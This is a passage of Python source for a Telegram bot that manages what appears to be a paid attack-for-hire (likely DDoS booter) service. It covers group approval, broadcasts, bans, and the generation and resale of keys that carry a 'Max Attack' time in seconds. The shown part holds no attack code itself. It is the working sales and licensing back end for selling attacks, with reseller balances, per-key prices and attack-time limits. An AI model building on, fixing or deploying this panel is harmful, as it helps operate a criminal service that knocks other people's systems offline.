        bot.reply_to(message, f"{HTML_EMOJI.CHECKMARK} <b>𝐆𝐫𝐨𝐮𝐩 {name} 𝐫𝐞𝐦𝐨𝐯𝐞𝐝 𝐟𝐫𝐨𝐦 𝐚𝐩𝐩𝐫𝐨𝐯𝐞𝐝 𝐥𝐢𝐬𝐭!</b>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
    else:
        bot.reply_to(message, f"{HTML_EMOJI.CROSS} <b>𝐆𝐫𝐨𝐮𝐩 {name} 𝐧𝐨𝐭 𝐟𝐨𝐮𝐧𝐝!</b>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)


@bot.message_handler(commands=["grpinfo"])
def group_info_command(message):
    user_id = message.from_user.id

    if not is_owner(user_id):
        bot.reply_to(message, f"{HTML_EMOJI.CROSS} <b>𝐓𝐡𝐢𝐬 𝐜𝐨𝐦𝐦𝐚𝐧𝐝 𝐜𝐚𝐧 𝐨𝐧𝐥𝐲 𝐛𝐞 𝐮𝐬𝐞𝐝 𝐛𝐲 𝐭𝐡𝐞 𝐨𝐰𝐧𝐞𝐫!</b>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
        return

    groups = list(approved_groups_collection.find())

    if not groups:
        bot.reply_to(message, f"{HTML_EMOJI.DOCUMENT} 𝐍𝐨 𝐚𝐩𝐩𝐫𝐨𝐯𝐞𝐝 𝐠𝐫𝐨𝐮𝐩𝐬 𝐟𝐨𝐮𝐧𝐝!", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
        return

    response = "═══════════════════════════\n"
    response += f"{HTML_EMOJI.USERS} 𝐀𝐏𝐏𝐑𝐎𝐕𝐄𝐃 𝐆𝐑𝐎𝐔𝐏𝐒\n"
    response += "═══════════════════════════\n\n"

    for i, group in enumerate(groups, 1):
        status = f"{HTML_EMOJI.CHECKMARK} 𝐀𝐜𝐭𝐢𝐯𝐞" if not group.get('expiry_date') or group['expiry_date'] > datetime.now() else f"{HTML_EMOJI.CROSS} 𝐄𝐱𝐩𝐢𝐫𝐞𝐝"
        response += f"{i}. <b>{group.get('name', 'Unknown')}</b>\n"
        response += f"   {HTML_EMOJI.PROFILE} 𝐆𝐫𝐨𝐮𝐩 𝐈𝐃: <code>{group['group_id']}</code>\n"
        response += f"   {HTML_EMOJI.STATS} 𝐒𝐭𝐚𝐭𝐮𝐬: {status}\n"
        response += f"   {HTML_EMOJI.SETTINGS} 𝐌𝐚𝐱 𝐓𝐢𝐦𝐞: {group.get('max_attack_time', get_max_attack_time())}s\n"
        response += f"   {HTML_EMOJI.TARGET} 𝐌𝐚𝐱 𝐒𝐥𝐨𝐭𝐬: {group.get('max_slots', current_max_slots)}\n"
        response += f"   {HTML_EMOJI.TIMER} 𝐂𝐨𝐨𝐥𝐝𝐨𝐰𝐧: {group.get('cooldown', get_user_cooldown_setting())}s\n"
        response += f"   {HTML_EMOJI.CAMERA} 𝐅𝐞𝐞𝐝𝐛𝐚𝐜𝐤 𝐑𝐞𝐪𝐮𝐢𝐫𝐞𝐝: {'𝐎𝐍' if group.get('feedback_required', get_setting('feedback_required', True)) else '𝐎𝐅𝐅'}\n"
        if group.get('expiry_date'):
            response += f"   {HTML_EMOJI.CALENDAR} 𝐄𝐱𝐩𝐢𝐫𝐞𝐬: {group['expiry_date'].strftime('%d-%m-%Y')}\n"
        response += "\n"

    response += "═══════════════════════════"

    bot.reply_to(message, response, parse_mode="HTML", reply_markup=MAIN_KEYBOARD)


# ============ BROADCAST COMMANDS ============

@bot.message_handler(commands=["broadcast"])
def broadcast_command(message):
    user_id = message.from_user.id

    if not is_owner(user_id):
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝐓𝐡𝐢𝐬 𝐜𝐨𝐦𝐦𝐚𝐧𝐝 𝐜𝐚𝐧 𝐨𝐧𝐥𝐲 𝐛𝐞 𝐮𝐬𝐞𝐝 𝐛𝐲 𝐭𝐡𝐞 𝐨𝐰𝐧𝐞𝐫!</b>", reply_to=message)
        return

    command_parts = message.text.split(maxsplit=1)
    if len(command_parts) < 2:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.WARNING} 𝐔𝐬𝐚𝐠𝐞: <code>/broadcast &lt;message&gt;</code>", reply_to=message)
        return

    broadcast_msg = command_parts[1]

    all_users = list(users_collection.find())
    all_resellers = list(resellers_collection.find())
    all_bot_users = list(bot_users_collection.find())

    all_user_ids = set()
    for u in all_users:
        all_user_ids.add(u['user_id'])
    for r in all_resellers:
        all_user_ids.add(r['user_id'])
    for bu in all_bot_users:
        all_user_ids.add(bu['user_id'])

    sent_count = 0
    failed_count = 0

    for uid in all_user_ids:
        try:
            if bot:
                bot.send_message(uid, f"{HTML_EMOJI.MEGAPHONE} <b>𝐁𝐑𝐎𝐀𝐃𝐂𝐀𝐒𝐓</b>\n\n{broadcast_msg}", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
                sent_count += 1
                time.sleep(0.05)
        except:
            failed_count += 1

    safe_send_message(message.chat.id, f"{HTML_EMOJI.CHECKMARK} <b>𝐁𝐫𝐨𝐚𝐝𝐜𝐚𝐬𝐭 𝐒𝐞𝐧𝐭!</b>\n\n{HTML_EMOJI.DOCUMENT} 𝐓𝐨𝐭𝐚𝐥: {len(all_user_ids)}\n{HTML_EMOJI.CHECKMARK} 𝐃𝐞𝐥𝐢𝐯𝐞𝐫𝐞𝐝: {sent_count}\n{HTML_EMOJI.CROSS} 𝐅𝐚𝐢𝐥𝐞𝐝: {failed_count}", reply_to=message)


@bot.message_handler(commands=["broadcastreseller"])
def broadcast_reseller_command(message):
    user_id = message.from_user.id

    if not is_owner(user_id):
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝐓𝐡𝐢𝐬 𝐜𝐨𝐦𝐦𝐚𝐧𝐝 𝐜𝐚𝐧 𝐨𝐧𝐥𝐲 𝐛𝐞 𝐮𝐬𝐞𝐝 𝐛𝐲 𝐭𝐡𝐞 𝐨𝐰𝐧𝐞𝐫!</b>", reply_to=message)
        return

    command_parts = message.text.split(maxsplit=1)
    if len(command_parts) < 2:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.WARNING} 𝐔𝐬𝐚𝐠𝐞: <code>/broadcastreseller &lt;message&gt;</code>", reply_to=message)
        return

    broadcast_msg = command_parts[1]

    resellers = list(resellers_collection.find())
    reseller_ids = set(r['user_id'] for r in resellers)

    sent_count = 0
    failed_count = 0

    for uid in reseller_ids:
        try:
            if bot:
                bot.send_message(uid, f"{HTML_EMOJI.MEGAPHONE} <b>𝐑𝐄𝐒𝐄𝐋𝐋𝐄𝐑 𝐍𝐎𝐓𝐈𝐂𝐄</b>\n\n{broadcast_msg}", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
                sent_count += 1
                time.sleep(0.05)
        except:
            failed_count += 1

    safe_send_message(message.chat.id, f"{HTML_EMOJI.CHECKMARK} <b>𝐑𝐞𝐬𝐞𝐥𝐥𝐞𝐫 𝐁𝐫𝐨𝐚𝐝𝐜𝐚𝐬𝐭 𝐒𝐞𝐧𝐭!</b>\n\n{HTML_EMOJI.DOCUMENT} 𝐓𝐨𝐭𝐚𝐥: {len(reseller_ids)}\n{HTML_EMOJI.CHECKMARK} 𝐃𝐞𝐥𝐢𝐯𝐞𝐫𝐞𝐝: {sent_count}\n{HTML_EMOJI.CROSS} 𝐅𝐚𝐢𝐥𝐞𝐝: {failed_count}", reply_to=message)


@bot.message_handler(commands=["broadcastpaid"])
def broadcast_paid_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝐓𝐡𝐢𝐬 𝐜𝐨𝐦𝐦𝐚𝐧𝐝 𝐜𝐚𝐧 𝐨𝐧𝐥𝐲 𝐛𝐞 𝐮𝐬𝐞𝐝 𝐛𝐲 𝐭𝐡𝐞 𝐨𝐰𝐧𝐞𝐫!</b>", reply_to=message)
        return

    command_parts = message.text.split(maxsplit=1)
    if len(command_parts) < 2:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.WARNING} 𝐔𝐬𝐚𝐠𝐞: <code>/broadcastpaid &lt;message&gt;</code>", reply_to=message)
        return

    broadcast_msg = command_parts[1]

    now = datetime.now()
    active_subscribers = list(users_collection.find({'key_expiry': {'$gt': now}}))

    if not active_subscribers:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.DOCUMENT} 𝐍𝐨 𝐚𝐜𝐭𝐢𝐯𝐞 𝐬𝐮𝐛𝐬𝐜𝐫𝐢𝐛𝐞𝐫𝐬 𝐭𝐨 𝐬𝐞𝐧𝐝 𝐦𝐞𝐬𝐬𝐚𝐠𝐞 𝐭𝐨!", reply_to=message)
        return

    sent_count = 0
    fail_count = 0

    for user in active_subscribers:
        try:
            target_id = user['user_id']
            if is_owner(target_id):
                continue
            if bot:
                bot.send_message(target_id, f"{HTML_EMOJI.MONEY} <b>𝐏𝐀𝐈𝐃 𝐔𝐒𝐄𝐑 𝐀𝐍𝐍𝐎𝐔𝐍𝐂𝐄𝐌𝐄𝐍𝐓</b>\n\n{broadcast_msg}", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
                sent_count += 1
                time.sleep(0.05)
        except Exception:
            fail_count += 1

    safe_send_message(message.chat.id, f"{HTML_EMOJI.CHECKMARK} <b>𝐁𝐫𝐨𝐚𝐝𝐜𝐚𝐬𝐭 𝐂𝐨𝐦𝐩𝐥𝐞𝐭𝐞!</b>\n\n{HTML_EMOJI.PROFILE} 𝐒𝐞𝐧𝐭 𝐭𝐨: {sent_count} 𝐩𝐚𝐢𝐝 𝐮𝐬𝐞𝐫𝐬\n{HTML_EMOJI.CROSS} 𝐅𝐚𝐢𝐥𝐞𝐝: {fail_count}", reply_to=message)


# ============ BAN COMMANDS ============

@bot.message_handler(commands=["ban"])
def ban_user_command(message):
    user_id = message.from_user.id

    if not is_owner(user_id):
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝐓𝐡𝐢𝐬 𝐜𝐨𝐦𝐦𝐚𝐧𝐝 𝐜𝐚𝐧 𝐨𝐧𝐥𝐲 𝐛𝐞 𝐮𝐬𝐞𝐝 𝐛𝐲 𝐭𝐡𝐞 𝐨𝐰𝐧𝐞𝐫!</b>", reply_to=message)
        return

    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.WARNING} 𝐔𝐬𝐚𝐠𝐞: <code>/ban &lt;id or @username&gt;</code>", reply_to=message)
        return

    target_user_id, resolved_name = resolve_user(command_parts[1])
    if not target_user_id:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝐔𝐬𝐞𝐫 𝐧𝐨𝐭 𝐟𝐨𝐮𝐧𝐝!</b>", reply_to=message)
        return

    if is_owner(target_user_id):
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝐂𝐚𝐧𝐧𝐨𝐭 𝐛𝐚𝐧 𝐭𝐡𝐞 𝐨𝐰𝐧𝐞𝐫!</b>", reply_to=message)
        return

    users_collection.update_one(
        {'user_id': target_user_id},
        {'$set': {'user_id': target_user_id, 'username': resolved_name, 'banned': True, 'banned_at': datetime.now()}},
        upsert=True
    )

    try:
        if bot:
            bot.send_message(target_user_id, f"{HTML_EMOJI.BAN} <b>𝐘𝐨𝐮 𝐡𝐚𝐯𝐞 𝐛𝐞𝐞𝐧 𝐛𝐚𝐧𝐧𝐞𝐝!</b>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
    except:
        pass

    display = f"@{resolved_name}" if resolved_name else str(target_user_id)
    safe_send_message(message.chat.id, f"{HTML_EMOJI.CHECKMARK} <b>𝐔𝐬𝐞𝐫 {display} 𝐛𝐚𝐧𝐧𝐞𝐝!</b>\n{HTML_EMOJI.PROFILE} 𝐈𝐃: {target_user_id}", reply_to=message)


@bot.message_handler(commands=["unban"])
def unban_user_command(message):
    user_id = message.from_user.id

    if not is_owner(user_id):
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝐓𝐡𝐢𝐬 𝐜𝐨𝐦𝐦𝐚𝐧𝐝 𝐜𝐚𝐧 𝐨𝐧𝐥𝐲 𝐛𝐞 𝐮𝐬𝐞𝐝 𝐛𝐲 𝐭𝐡𝐞 𝐨𝐰𝐧𝐞𝐫!</b>", reply_to=message)
        return

    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.WARNING} 𝐔𝐬𝐚𝐠𝐞: <code>/unban &lt;id or @username&gt;</code>", reply_to=message)
        return

    target_user_id, resolved_name = resolve_user(command_parts[1])
    if not target_user_id:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝐔𝐬𝐞𝐫 𝐧𝐨𝐭 𝐟𝐨𝐮𝐧𝐝!</b>", reply_to=message)
        return

    result = users_collection.update_one(
        {'user_id': target_user_id},
        {'$set': {'banned': False}}
    )

    display = f"@{resolved_name}" if resolved_name else str(target_user_id)
    if result.modified_count > 0:
        try:
            if bot:
                bot.send_message(target_user_id, f"{HTML_EMOJI.CHECKMARK} <b>𝐘𝐨𝐮𝐫 𝐛𝐚𝐧 𝐡𝐚𝐬 𝐛𝐞𝐞𝐧 𝐥𝐢𝐟𝐭𝐞𝐝!</b>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
        except:
            pass
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CHECKMARK} <b>𝐔𝐬𝐞𝐫 {display} 𝐮𝐧𝐛𝐚𝐧𝐧𝐞𝐝!</b>\n{HTML_EMOJI.PROFILE} 𝐈𝐃: {target_user_id}", reply_to=message)
    else:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝐔𝐬𝐞𝐫 𝐧𝐨𝐭 𝐟𝐨𝐮𝐧𝐝 𝐨𝐫 𝐚𝐥𝐫𝐞𝐚𝐝𝐲 𝐮𝐧𝐛𝐚𝐧𝐧𝐞𝐝!</b>", reply_to=message)


@bot.message_handler(commands=["tban"])
def tban_user_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝐓𝐡𝐢𝐬 𝐜𝐨𝐦𝐦𝐚𝐧𝐝 𝐜𝐚𝐧 𝐨𝐧𝐥𝐲 𝐛𝐞 𝐮𝐬𝐞𝐝 𝐛𝐲 𝐭𝐡𝐞 𝐨𝐰𝐧𝐞𝐫!</b>", reply_to=message)
        return

    command_parts = message.text.split()
    if len(command_parts) != 3:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.WARNING} 𝐔𝐬𝐚𝐠𝐞: <code>/tban &lt;id or @username&gt; &lt;time&gt;</code>\n𝐄𝐱𝐚𝐦𝐩𝐥𝐞: <code>/tban 123456 10m</code>", reply_to=message)
        return

    target_user_id, resolved_name = resolve_user(command_parts[1])
    if not target_user_id:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝐔𝐬𝐞𝐫 𝐧𝐨𝐭 𝐟𝐨𝐮𝐧𝐝!</b>", reply_to=message)
        return

    if is_owner(target_user_id):
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝐂𝐚𝐧𝐧𝐨𝐭 𝐛𝐚𝐧 𝐭𝐡𝐞 𝐨𝐰𝐧𝐞𝐫!</b>", reply_to=message)
        return

    duration_str = command_parts[2]
    duration_td, label = parse_duration(duration_str)

    if not duration_td:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐝𝐮𝐫𝐚𝐭𝐢𝐨𝐧 𝐟𝐨𝐫𝐦𝐚𝐭!</b> 𝐔𝐬𝐞: 10m, 1h, 1d 𝐞𝐭𝐜.", reply_to=message)
        return

    ban_expiry = datetime.now() + duration_td
    users_collection.update_one(
        {'user_id': target_user_id},
        {'$set': {'banned': True, 'ban_type': 'temporary', 'ban_expiry': ban_expiry}},
        upsert=True
    )

    safe_send_message(message.chat.id, f"{HTML_EMOJI.BAN} <b>𝐔𝐬𝐞𝐫 {resolved_name or target_user_id} 𝐡𝐚𝐬 𝐛𝐞𝐞𝐧 𝐛𝐚𝐧𝐧𝐞𝐝 𝐟𝐨𝐫 {label}!</b>\n{HTML_EMOJI.TIMER} 𝐄𝐱𝐩𝐢𝐫𝐲: {ban_expiry.strftime('%d-%m-%Y %H:%M:%S')}", reply_to=message)


# ============ GEN COMMAND ============

@bot.message_handler(commands=["gen"])
def generate_key_command(message):
    if check_maintenance(message): return
    if check_banned(message): return
    user_id = message.from_user.id

    reseller = get_reseller(user_id)

    if not is_owner(user_id) and not reseller:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝐓𝐡𝐢𝐬 𝐜𝐨𝐦𝐦𝐚𝐧𝐝 𝐜𝐚𝐧 𝐨𝐧𝐥𝐲 𝐛𝐞 𝐮𝐬𝐞𝐝 𝐛𝐲 𝐨𝐰𝐧𝐞𝐫/𝐫𝐞𝐬𝐞𝐥𝐥𝐞𝐫!</b>", reply_to=message)
        return

    if reseller and reseller.get('blocked'):
        safe_send_message(message.chat.id, f"{HTML_EMOJI.BAN} <b>𝐘𝐨𝐮𝐫 𝐩𝐚𝐧𝐞𝐥 𝐢𝐬 𝐛𝐥𝐨𝐜𝐤𝐞𝐝!</b>", reply_to=message)
        return

    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("⭐ VIP KEY", callback_data="keytype_vip"),
        InlineKeyboardButton("📄 NORMAL KEY", callback_data="keytype_normal")
    )

    bot.reply_to(message, f"{HTML_EMOJI.KEY} <b>𝐒𝐄𝐋𝐄𝐂𝐓 𝐊𝐄𝐘 𝐓𝐘𝐏𝐄</b>\n\n𝐂𝐡𝐨𝐨𝐬𝐞 𝐭𝐡𝐞 𝐭𝐲𝐩𝐞 𝐨𝐟 𝐤𝐞𝐲 𝐲𝐨𝐮 𝐰𝐚𝐧𝐭 𝐭𝐨 𝐠𝐞𝐧𝐞𝐫𝐚𝐭𝐞:", reply_markup=markup, parse_mode="HTML")


@bot.callback_query_handler(func=lambda call: call.data.startswith("keytype_"))
def key_type_callback(call):
    # ZAROORI FIX: Answer query immediately
    bot.answer_callback_query(call.id)
    
    user_id = call.from_user.id

    if not is_owner(user_id) and not get_reseller(user_id):
        bot.send_message(call.message.chat.id, f"{HTML_EMOJI.CROSS} <b>You are not authorized!</b>", parse_mode="HTML")
        return

    key_type = call.data.replace("keytype_", "").upper()

    temp_key_gen[user_id] = {'key_type': key_type}

    bot.edit_message_text(
        f"{HTML_EMOJI.CHECKMARK} 𝐒𝐞𝐥𝐞𝐜𝐭𝐞𝐝: <b>{key_type} 𝐊𝐄𝐘</b>\n\n"
        f"{HTML_EMOJI.DOCUMENT} 𝐍𝐨𝐰 𝐬𝐞𝐧𝐝 𝐭𝐡𝐞 𝐤𝐞𝐲 𝐝𝐞𝐭𝐚𝐢𝐥𝐬 𝐢𝐧 𝐭𝐡𝐢𝐬 𝐟𝐨𝐫𝐦𝐚𝐭:\n"
        f"<code>/gen &lt;prefix&gt; &lt;duration&gt; &lt;count&gt;</code>\n\n"
        f"𝐄𝐱𝐚𝐦𝐩𝐥𝐞: <code>/gen RAPID-X 1d 5</code>\n\n"
        f"𝐃𝐮𝐫𝐚𝐭𝐢𝐨𝐧 𝐟𝐨𝐫𝐦𝐚𝐭𝐬: 2h, 6h, 12h, 1d, 3d, 7d\n"
        f"𝐌𝐚𝐱 𝐜𝐨𝐮𝐧𝐭: 50 𝐟𝐨𝐫 𝐨𝐰𝐧𝐞𝐫, 20 𝐟𝐨𝐫 𝐫𝐞𝐬𝐞𝐥𝐥𝐞𝐫\n\n"
        f"𝐓𝐲𝐩𝐞 /cancel 𝐭𝐨 𝐚𝐛𝐨𝐫𝐭.",
        call.message.chat.id,
        call.message.message_id,
        parse_mode="HTML"
    )
    bot.register_next_step_handler(call.message, process_key_gen)


def process_key_gen(message):
    user_id = message.from_user.id

    if message.text == "/cancel":
        if user_id in temp_key_gen:
            del temp_key_gen[user_id]
        bot.reply_to(message, f"{HTML_EMOJI.CROSS} <b>𝐎𝐩𝐞𝐫𝐚𝐭𝐢𝐨𝐧 𝐜𝐚𝐧𝐜𝐞𝐥𝐥𝐞𝐝!</b>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
        return

    if user_id not in temp_key_gen:
        bot.reply_to(message, f"{HTML_EMOJI.CROSS} <b>𝐏𝐥𝐞𝐚𝐬𝐞 𝐮𝐬𝐞 /gen 𝐜𝐨𝐦𝐦𝐚𝐧𝐝 𝐟𝐢𝐫𝐬𝐭!</b>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
        return

    key_type = temp_key_gen[user_id]['key_type']
    del temp_key_gen[user_id]

    command_parts = message.text.split()
    if len(command_parts) != 4:
        bot.reply_to(message, f"{HTML_EMOJI.WARNING} 𝐔𝐬𝐚𝐠𝐞: <code>/gen &lt;prefix&gt; &lt;duration&gt; &lt;count&gt;</code>\n\n𝐄𝐱𝐚𝐦𝐩𝐥𝐞: <code>/gen RAPID-X 1d 5</code>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
        return

    prefix = command_parts[1].upper()
    duration_str = command_parts[2].lower()

    duration_key = None
    for d in ['2h', '6h', '12h', '1d', '3d', '7d']:
        if duration_str == d:
            duration_key = d
            break

    if not duration_key:
        bot.reply_to(message, f"{HTML_EMOJI.CROSS} <b>𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐟𝐨𝐫𝐦𝐚𝐭!</b> 𝐔𝐬𝐞: 2h, 6h, 12h, 1d, 3d, 7d", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
        return

    duration_seconds = DURATION_SECONDS[duration_key]
    duration_label = DURATION_LABELS[duration_key]

    try:
        count = int(command_parts[3])
        max_count = 50 if is_owner(user_id) else 20
        if count < 1 or count > max_count:
            bot.reply_to(message, f"{HTML_EMOJI.CROSS} <b>𝐂𝐨𝐮𝐧𝐭 𝐦𝐮𝐬𝐭 𝐛𝐞 𝐛𝐞𝐭𝐰𝐞𝐞𝐧 1-{max_count}!</b>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
            return
    except:
        bot.reply_to(message, f"{HTML_EMOJI.CROSS} <b>𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐜𝐨𝐮𝐧𝐭!</b>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
        return

    reseller = get_reseller(user_id)

    price_per_key = get_key_price(key_type, duration_key)
    max_attack_time = get_key_max_attack(key_type)
    total_price = price_per_key * count

    if is_owner(user_id):
        generated_keys = []
        for _ in range(count):
            key = generate_key(prefix, 12)
            key_doc = {
                'key': key,
                'duration_seconds': duration_seconds,
                'duration_label': duration_label,
                'created_at': datetime.now(),
                'created_by': user_id,
                'created_by_type': 'owner',
                'used': False,
                'used_by': None,
                'used_at': None,
                'max_users': 1,
                'key_type': key_type,
                'max_attack_time': max_attack_time
            }
            keys_collection.insert_one(key_doc)
            generated_keys.append(key)

        if count == 1:
            bot.reply_to(message, f"{HTML_EMOJI.CHECKMARK} <b>{key_type} 𝐊𝐞𝐲 𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐞𝐝!</b>\n\n{HTML_EMOJI.KEY} 𝐊𝐞𝐲: <code>{generated_keys[0]}</code>\n{HTML_EMOJI.TIMER} 𝐃𝐮𝐫𝐚𝐭𝐢𝐨𝐧: {duration_label}\n{HTML_EMOJI.FIRE} 𝐌𝐚𝐱 𝐀𝐭𝐭𝐚𝐜𝐤: {max_attack_time}s\n{HTML_EMOJI.CREDIT} 𝐏𝐫𝐢𝐜𝐞: {price_per_key} 𝐑𝐬", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
        else:
            keys_text = "\n".join([f"• <code>{k}</code>" for k in generated_keys])
            bot.reply_to(message, f"{HTML_EMOJI.CHECKMARK} <b>{count} {key_type} 𝐊𝐞𝐲𝐬 𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐞𝐝!</b>\n\n{HTML_EMOJI.KEY} 𝐊𝐞𝐲𝐬:\n{keys_text}\n\n{HTML_EMOJI.TIMER} 𝐃𝐮𝐫𝐚𝐭𝐢𝐨𝐧: {duration_label}\n{HTML_EMOJI.FIRE} 𝐌𝐚𝐱 𝐀𝐭𝐭𝐚𝐜𝐤: {max_attack_time}s\n{HTML_EMOJI.CREDIT} 𝐓𝐨𝐭𝐚𝐥 𝐏𝐫𝐢𝐜𝐞: {total_price} 𝐑𝐬", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)

    elif reseller:
        balance = reseller.get('balance', 0)

        if balance < total_price:
            bot.reply_to(message, f"{HTML_EMOJI.CROSS} <b>𝐈𝐧𝐬𝐮𝐟𝐟𝐢𝐜𝐢𝐞𝐧𝐭 𝐛𝐚𝐥𝐚𝐧𝐜𝐞!</b>\n\n{HTML_EMOJI.CREDIT} 𝐑𝐞𝐪𝐮𝐢𝐫𝐞𝐝: {total_price} 𝐑𝐬 ({count} 𝐱 {price_per_key})\n{HTML_EMOJI.MONEY} 𝐘𝐨𝐮𝐫 𝐁𝐚𝐥𝐚𝐧𝐜𝐞: {balance} 𝐑𝐬\n\n𝐀𝐝𝐝 𝐛𝐚𝐥𝐚𝐧𝐜𝐞 𝐟𝐫𝐨𝐦 𝐨𝐰𝐧𝐞𝐫!", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
            return

        username = message.from_user.username or str(user_id)
        generated_keys = []

        for _ in range(count):
            key = f"{username}-{generate_key(username, 8)}"
            key_doc = {
                'key': key,
                'duration_seconds': duration_seconds,
                'duration_label': duration_label,
                'created_at': datetime.now(),
                'created_by': user_id,
                'created_by_username': username,
                'created_by_type': 'reseller',
                'used': False,
                'used_by': None,
                'used_at': None,
                'max_users': 1,
                'key_type': key_type,
                'max_attack_time': max_attack_time
            }
            keys_collection.insert_one(key_doc)
            generated_keys.append(key)

        new_balance = balance - total_price
        resellers_collection.update_one(
            {'user_id': user_id},
            {'$set': {'balance': new_balance}, '$inc': {'total_keys_generated': count}}
        )

        try:
            keys_list_str = "\n".join([f"{k}" for k in generated_keys])
            owner_msg = (
                f"{HTML_EMOJI.BELL} <b>𝐑𝐄𝐒𝐄𝐋𝐋𝐄𝐑 𝐊𝐄𝐘 𝐆𝐄𝐍𝐄𝐑𝐀𝐓𝐈𝐎𝐍 𝐍𝐎𝐓𝐈𝐅𝐈𝐂𝐀𝐓𝐈𝐎𝐍</b>\n\n"
                f"{HTML_EMOJI.PROFILE} 𝐑𝐞𝐬𝐞𝐥𝐥𝐞𝐫: {username} ({user_id})\n"
                f"{HTML_EMOJI.KEY} 𝐊𝐞𝐲𝐬 𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐞𝐝: {count}\n"
                f"{HTML_EMOJI.STAR} 𝐊𝐞𝐲 𝐓𝐲𝐩𝐞: {key_type}\n"
                f"{HTML_EMOJI.TIMER} 𝐃𝐮𝐫𝐚𝐭𝐢𝐨𝐧: {duration_label}\n"
                f"{HTML_EMOJI.CREDIT} 𝐏𝐫𝐢𝐜𝐞 𝐩𝐞𝐫 𝐊𝐞𝐲: {price_per_key} 𝐑𝐬\n"
                f"{HTML_EMOJI.CREDIT} 𝐓𝐨𝐭𝐚𝐥 𝐂𝐨𝐬𝐭: {total_price} 𝐑𝐬\n"
                f"{HTML_EMOJI.MONEY} 𝐑𝐞𝐦𝐚𝐢𝐧𝐢𝐧𝐠 𝐁𝐚𝐥𝐚𝐧𝐜𝐞: {new_balance} 𝐑𝐬\n\n"
                f"{HTML_EMOJI.DOCUMENT} 𝐊𝐞𝐲𝐬:\n{keys_list_str}"
            )
            for owner in BOT_OWNER:
                if bot:
                    bot.send_message(owner, owner_msg, parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
        except Exception as e:
            print(f"Failed to notify owner: {e}")

        if count == 1:
            bot.reply_to(message, f"{HTML_EMOJI.CHECKMARK} <b>{key_type} 𝐊𝐞𝐲 𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐞𝐝!</b>\n\n{HTML_EMOJI.KEY} 𝐊𝐞𝐲: <code>{generated_keys[0]}</code>\n{HTML_EMOJI.TIMER} 𝐃𝐮𝐫𝐚𝐭𝐢𝐨𝐧: {duration_label}\n{HTML_EMOJI.MONEY} 𝐁𝐚𝐥𝐚𝐧𝐜𝐞: {new_balance} 𝐑𝐬\n{HTML_EMOJI.FIRE} 𝐌𝐚𝐱 𝐀𝐭𝐭𝐚𝐜𝐤: {max_attack_time}s", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
        else:
            keys_text = "\n".join([f"• <code>{k}</code>" for k in generated_keys])
            bot.reply_to(message, f"{HTML_EMOJI.CHECKMARK} <b>{count} {key_type} 𝐊𝐞𝐲𝐬 𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐞𝐝!</b>\n\n{HTML_EMOJI.KEY} 𝐊𝐞𝐲𝐬:\n{keys_text}\n\n{HTML_EMOJI.TIMER} 𝐃𝐮𝐫𝐚𝐭𝐢𝐨𝐧: {duration_label}\n{HTML_EMOJI.CREDIT} 𝐂𝐨𝐬𝐭: {total_price} 𝐑𝐬\n{HTML_EMOJI.MONEY} 𝐁𝐚𝐥𝐚𝐧𝐜𝐞: {new_balance} 𝐑𝐬\n{HTML_EMOJI.FIRE} 𝐌𝐚𝐱 𝐀𝐭𝐭𝐚𝐜𝐤: {max_attack_time}s", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)


@bot.message_handler(commands=["cooldown"])
def cooldown_command(message):
    user_id = message.from_user.id

    if not is_owner(user_id):
